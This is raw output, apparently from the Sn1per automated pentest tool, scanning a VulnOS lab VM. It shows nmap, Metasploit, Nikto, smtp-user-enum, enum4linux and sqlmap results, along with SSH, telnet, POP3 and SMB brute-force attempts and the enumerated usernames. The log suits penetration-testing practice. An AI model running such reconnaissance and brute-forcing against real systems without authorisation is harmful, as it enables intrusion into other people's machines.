+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+Tired of typing 'set RHOSTS'? Click & pwn with Metasploit Pro
+Learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+USER_FILE => /pentest/web/Sn1per/BruteX/wordlists/simple-users.txt
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141:22 - SSH - Checking for false positives
+[-] 192.168.1.141:22 - SSH - throws false positive results. Aborting.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.141:22 SSH server version: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7 ( service.version=5.3p1 openssh.comment=Debian-3ubuntu7 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=10.04 )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
++ -- --=[Port 23 opened... running tests...
+
+Using config file torch.conf...
+Loading include and plugin ...
+
+###############################################################
+#   Cisco Torch Mass Scanner                   #
+#   Becase we need it...                                      #
+#   http://www.arhont.com/cisco-torch.pl                      #
+###############################################################
+
+List of targets contains 1 host(s)
+6463:	Checking 192.168.1.141 ...
+HUH db not found, it should be in fingerprint.db
+Skipping Telnet fingerprint
+--->
+- All scans done. Cisco Torch Mass Scanner  -
+---> Exiting.
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:50 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00013s latency).
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+| telnet-brute: 
+|   Accounts: No valid accounts found
+|   Statistics: Performed 1 guesses in 13 seconds, average tps: 0
+|_  ERROR: Too many retries, aborted ...
+| telnet-encryption: 
+|_  Telnet server does not support encryption
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.89 seconds
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+Payload caught by AV? Fly under the radar with Dynamic Payloads in
+Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOSTS => 192.168.1.141
+RHOST => 192.168.1.141
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[-] 192.168.1.141:23 Timed out after 30 seconds
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] It doesn't seem to be a RuggedCom service.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.141:23 TELNET Ubuntu 10.04.4 LTS\x0aVulnOS login:
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
++ -- --=[Port 25 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:51 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00016s latency).
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: VulnOS.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| smtp-enum-users: 
+|_  Couldn't establish connection on port 25
+|_smtp-open-relay: Failed to issue relaytest@nmap.scanme.org command (SMTP RCPT TO:<relaytest@nmap.scanme.org>: failed to receive data: connection timeout)
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+Service Info: Host:  VulnOS.home
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.80 seconds
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... BruteX/wordlists/simple-users.txt
+Target count ............. 1
+Username count ........... 31
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Mon Dec 28 10:52:32 2015 #########
+ exists.1.141: mail
+ exists.1.141: postgres
+ exists.1.141: postfix
+######## Scan completed at Mon Dec 28 10:52:58 2015 #########
+3 results.
+
+31 queries in 26 seconds (1.2 queries / sec)
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            http://metasploit.pro
+
+
+Payload caught by AV? Fly under the radar with Dynamic Payloads in
+Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141:25 Banner: 220 VulnOS.home ESMTP Postfix (Ubuntu)
+[+] 192.168.1.141:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, postgres, postmaster, proxy, sshd, sync, sys, sysadmin, syslog, uucp, www-data
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
++ -- --=[Port 53 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:56 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00016s latency).
+PORT   STATE SERVICE VERSION
+53/tcp open  domain  ISC BIND 9.7.0-P1
+|_dns-fuzz: ERROR: Script execution failed (use -d to debug)
+|_dns-nsec-enum: Can't determine domain for host 192.168.1.141; use dns-nsec-enum.domains script arg.
+|_dns-nsec3-enum: Can't determine domain for host 192.168.1.141; use dns-nsec3-enum.domains script arg.
+| dns-nsid: 
+|_  bind.version: 9.7.0-P1
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| dns-blacklist: 
+|   PROXY
+|     dnsbl.tornevall.org - FAIL
+|_    tor.dan.me.uk - FAIL
+|_dns-brute: Can't guess domain of "192.168.1.141"; use dns-brute.domain script argument.
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.97 seconds
++ -- --=[Port 79 closed... skipping.
++ -- --=[Port 80 opened... running tests...
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/  
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/    
+                                <   
+                                 ...'
+                                 
+    WAFW00F - Web Application Firewall Detection Tool
+    
+    By Sandro Gauci && Wendel G. Henrique
+
+Checking http://192.168.1.141
+Generic Detection results:
+No WAF detected by the generic detection
+Number of requests: 13
+
+http://192.168.1.141 [200] Apache[2.2.14], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.14 (Ubuntu)], IP[192.168.1.141]
+
+	__  ______ _____ 
+	\ \/ / ___|_   _|
+	 \  /\___ \ | |  
+	 /  \ ___) || |  
+	/_/\_|____/ |_|  
+
++ -- --=[Cross-Site Tracer v1.3 by 1N3 @ CrowdShield
++ -- --=[Target: 192.168.1.141:80
++ -- --=[Site not vulnerable to Cross-Site Tracing!
++ -- --=[Site vulnerable to host header injection!
++ -- --=[Site vulnerable to Cross-Frame Scripting!
++ -- --=[Site vulnerable to Clickjacking!
+
+HTTP/1.1 405 Method Not Allowed
+Date: Mon, 28 Dec 2015 15:56:49 GMT
+Server: Apache/2.2.14 (Ubuntu)
+Allow: 
+Vary: Accept-Encoding
+Content-Length: 302
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>405 Method Not Allowed</title>
+</head><body>
+<h1>Method Not Allowed</h1>
+<p>The requested method TRACE is not allowed for the URL /.</p>
+<hr>
+<address>Apache/2.2.14 (Ubuntu) Server at 192.168.1.141 Port 80</address>
+</body></html>
+
+HTTP/1.1 200 OK
+Date: Mon, 28 Dec 2015 15:56:49 GMT
+Server: Apache/2.2.14 (Ubuntu)
+Last-Modified: Sun, 30 Mar 2014 00:35:52 GMT
+ETag: "10353b-2e9-4f5c81e0490a0"
+Accept-Ranges: bytes
+Content-Length: 745
+Vary: Accept-Encoding
+Content-Type: text/html
+X-Pad: avoid browser bug
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+
+
+<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>index</title></head><body>
+<div style="text-align: center;">&nbsp;<big><big><big><span style="font-weight: bold;">Welcome to VulnOS !</span><br style="font-weight: bold;">
+<span style="font-weight: bold;">This is a vulnerable server. DO NOT USE this OS in a production environment !!!</span><br>
+</big></big></big></div>
+<div style="text-align: right;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+<big><big><a href="index2.html">next page&gt;</a></big></big>
+
+</div>
+</body></
+
+
+
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:57 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00022s latency).
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /nagios3/cgi-bin/statuswml.cgi: Nagios3 (401 Authorization Required)
+|   /nagios3/: Nagios3 (401 Authorization Required)
+|   /phpmyadmin/: phpMyAdmin
+|   /.htaccess: Incorrect permissions on .htaccess or .htpasswd files
+|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.14 (ubuntu)'
+|_  /icons/: Potentially interesting folder w/ directory listing
+|_http-feed: Couldn't find any feeds.
+|_http-frontpage-login: false
+| http-headers: 
+|   Date: Mon, 28 Dec 2015 15:57:07 GMT
+|   Server: Apache/2.2.14 (Ubuntu)
+|   Last-Modified: Sun, 30 Mar 2014 00:35:52 GMT
+|   ETag: "10353b-2e9-4f5c81e0490a0"
+|   Accept-Ranges: bytes
+|   Content-Length: 745
+|   Vary: Accept-Encoding
+|   Connection: close
+|   Content-Type: text/html
+|   
+|_  (Request type: HEAD)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-referer-checker: Couldn't find any cross-domain scripts.
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-useragent-tester: 
+|   
+|     Allowed User Agents:
+|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+|     libwww
+|     lwp-trivial
+|     libcurl-agent/1.0
+|     PHP/
+|     Python-urllib/2.5
+|     GT::WWW
+|     Snoopy
+|     MFC_Tear_Sample
+|     HTTP::Lite
+|     PHPCrawl
+|     URI::Fetch
+|     Zend_Http_Client
+|     http client
+|     PECL::HTTP
+|     Wget/1.13.4 (linux-gnu)
+|     WWW-Mechanize/1.34
+|_  
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.97 seconds
++ -- --=[Checking if X-Content options are enabled on 192.168.1.141... 
+
++ -- --=[Checking if X-Frame options are enabled on 192.168.1.141... 
+
++ -- --=[Checking if X-XSS-Protection header is enabled on 192.168.1.141... 
+
++ -- --=[Checking HTTP methods on 192.168.1.141... 
+Allow: GET,HEAD,POST,OPTIONS
+
++ -- --=[Checking if TRACE method is enabled on 192.168.1.141... 
+
++ -- --=[Checking for open proxy on 192.168.1.141... 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /.testing/openproxy.txt was not found on this server.</p>
+<hr>
+<address>Apache/2.2.14 (Ubuntu) Server at crowdshield.com Port 80</address>
+</body></html>
+
++ -- --=[Enumerating software on 192.168.1.141... 
+Server: Apache/2.2.14 (Ubuntu)
+
++ -- --=[Checking if Strict-Transport-Security is enabled on 192.168.1.141... 
+
++ -- --=[Checking for Flash cross-domain policy on 192.168.1.141... 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /crossdomain.xml was not found on this server.</p>
+<hr>
+<address>Apache/2.2.14 (Ubuntu) Server at 192.168.1.141 Port 80</address>
+</body></html>
+
++ -- --=[Checking for Silverlight cross-domain policy on 192.168.1.141... 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /clientaccesspolicy.xml was not found on this server.</p>
+<hr>
+<address>Apache/2.2.14 (Ubuntu) Server at 192.168.1.141 Port 80</address>
+</body></html>
+
++ -- --=[Checking for HTML5 cross-origin resource sharing on 192.168.1.141... 
+
++ -- --=[Retrieving robots.txt on 192.168.1.141... 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /robots.txt was not found on this server.</p>
+<hr>
+<address>Apache/2.2.14 (Ubuntu) Server at 192.168.1.141 Port 80</address>
+</body></html>
+
++ -- --=[Retrieving sitemap.xml on 192.168.1.141... 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /sitemap.xml was not found on this server.</p>
+<hr>
+<address>Apache/2.2.14 (Ubuntu) Server at 192.168.1.141 Port 80</address>
+</body></html>
+
++ -- --=[Checking cookie attributes on 192.168.1.141... 
+
++ -- --=[Checking for ASP.NET Detailed Errors on 192.168.1.141... 
+
++ -- --=[Checking for Rom-0 Router Vulnerabilities on 192.168.1.141... 
+
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.141
++ Target Hostname:    192.168.1.141
++ Target Port:        80
++ Start Time:         2015-12-28 10:57:36 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.14 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, inode: 1062203, size: 745, mtime: Sat Mar 29 20:35:52 2014
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
++ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /doc/: Directory indexing found.
++ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
++ OSVDB-3268: /imgs/: Directory indexing found.
++ OSVDB-3092: /imgs/: This might be interesting...
++ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.23
++ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3093: /.htaccess: Contains configuration and/or authorization information
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ Cookie 5d89dac18813e15aa2f75788275e3588 created without the httponly flag
++ /phpldapadmin/: Admin login page/section found.
++ Cookie PPA_ID created without the httponly flag
++ /phppgadmin/: Admin login page/section found.
++ /phpmyadmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 8497 requests: 0 error(s) and 23 item(s) reported on remote host
++ End Time:           2015-12-28 10:57:55 (GMT-5) (19 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.8
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+
+[!] [!] The remote website is up, but does not seem to be running WordPress.
+[-] Date & Time: 28/12/2015 10:57:55
+[-] Target: http://192.168.1.141
+[ERROR] CMS detection failed :(
+[ERROR] Use -f to force CMSmap to scan (W)ordpress, (J)oomla or (D)rupal
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-dc90740}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:57:55
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] n
+[10:57:55] [INFO] starting crawler
+[10:57:55] [INFO] searching for links with depth 1
+[10:57:55] [INFO] searching for links with depth 2                                                                                                                                                                                     
+please enter number of threads? [Enter for 1 (current)] 1
+[10:57:55] [WARNING] running in a single-thread mode. This could take a while
+[10:57:55] [INFO] searching for links with depth 3                                                                                                                                                                                     
+please enter number of threads? [Enter for 1 (current)] 1
+[10:57:55] [WARNING] running in a single-thread mode. This could take a while
+[10:57:55] [INFO] searching for links with depth 4                                                                                                                                                                                     
+please enter number of threads? [Enter for 1 (current)] 1
+[10:57:55] [WARNING] running in a single-thread mode. This could take a while
+[10:57:55] [INFO] searching for links with depth 5                                                                                                                                                                                     
+please enter number of threads? [Enter for 1 (current)] 1
+[10:57:55] [WARNING] running in a single-thread mode. This could take a while
+[10:57:55] [WARNING] no usable links found (with GET parameters)                                                                                                                                                                       
+
+[*] shutting down at 10:57:56
+
++ -- --=[Port 110 opened... running tests...
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 10:57 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00016s latency).
+PORT    STATE SERVICE VERSION
+110/tcp open  pop3    Dovecot pop3d
+| pop3-brute: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 50009 guesses in 468 seconds, average tps: 109
+|_pop3-capabilities: SASL CAPA UIDL TOP RESP-CODES PIPELINING STLS
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 468.59 seconds
++ -- --=[Port 111 opened... running tests...
+All mount points on 192.168.1.141:
+Directories on 192.168.1.141:
+Export list for 192.168.1.141:
++ -- --=[Port 135 closed... skipping.
++ -- --=[Port 139 opened... running tests...
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec 28 11:05:44 2015
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.1.141
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 192.168.1.141    |
+ ===================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================= 
+|    Nbtstat Information for 192.168.1.141    |
+ ============================================= 
+Looking up status of 192.168.1.141
+	VULNOS          <00> -         B <ACTIVE>  Workstation Service
+	VULNOS          <03> -         B <ACTIVE>  Messenger Service
+	VULNOS          <20> -         B <ACTIVE>  File Server Service
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+
+	MAC Address = 00-00-00-00-00-00
+
+ ====================================== 
+|    Session Check on 192.168.1.141    |
+ ====================================== 
+[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+Traceback (most recent call last):
+  File "bin/samrdump.py", line 21, in <module>
+    from impacket.examples import logger
+ImportError: cannot import name logger
+Doing NBT name scan for addresses from 192.168.1.141
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.1.141    VULNOS           <server>  VULNOS           00:00:00:00:00:00
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:05 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00026s latency).
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb-mbenum: 
+|_  ERROR: Failed to connect to browser service: SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
+|_smb-print-text: false
+| smb-psexec: Can't find the service file: nmap_service.exe (or nmap_service).
+| Due to false positives in antivirus software, this module is no
+| longer included by default. Please download it from
+| https://nmap.org/psexec/nmap_service.exe
+|_and place it in nselib/data/psexec/ under the Nmap DATADIR.
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
+                                                  
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .
+                ',@@     @   ;           _____________
+                 (   3 C    )     /|___ / Metasploit! \
+                 ;@'. __*__,."    \|--- \_____________/
+                  '(.,...."/
+
+
+Tired of typing 'set RHOSTS'? Click & pwn with Metasploit Pro
+Learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[-] 192.168.1.141:445 - Error runing query against HKU. Rex::Proto::DCERPC::Exceptions::BindError. Failed to bind. Could not bind to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.141[\svcctl]
+[*] 192.168.1.141:445 - Executing cleanup
+[-] 192.168.1.141:445 - Unable to processes cleanup commands: Failed to bind. Could not bind to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.141[\svcctl]
+[!] 192.168.1.141:445 - Maybe %SYSTEMDRIVE%\WINDOWS\Temp\yknJcMudcAjcIPjx.txt must be deleted manually
+[!] 192.168.1.141:445 - Maybe %SYSTEMDRIVE%\WINDOWS\Temp\MECBzgKcRjZamUPf.bat must be deleted manually
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] Connecting to the server...
+[*] Mounting the remote share \\192.168.1.141\SYSVOL'...
+[-] 192.168.1.141: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: 0x00430001 (Command=117 WordCount=0)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[+] 192.168.1.141:139 - print$ - (DISK) Printer Drivers
+[+] 192.168.1.141:139 - IPC$ - (IPC) IPC Service (VulnOS server (Samba
+[+] Ubuntu))
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141 VULNOS [ stupiduser, ftp, nobody, sysadmin, vulnosadmin, webmin, hackme, sa ] ( LockoutTries=0 PasswordMin=5 )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+UUID 6bffd098-a112-3610-9833-46c3f87e345a 1.0 ERROR Failed to bind. Could not bind to 6bffd098-a112-3610-9833-46c3f87e345a:1.0@ncacn_np:192.168.1.141[\wkssvc]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141:445 SMB - Starting SMB login bruteforce
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+RHOSTS => 192.168.1.141
+[*] 192.168.1.141 PIPE(LSARPC) LOCAL(VULNOS - 5-21-943354670-1599095473-2771928314) DOMAIN(WORKGROUP - )
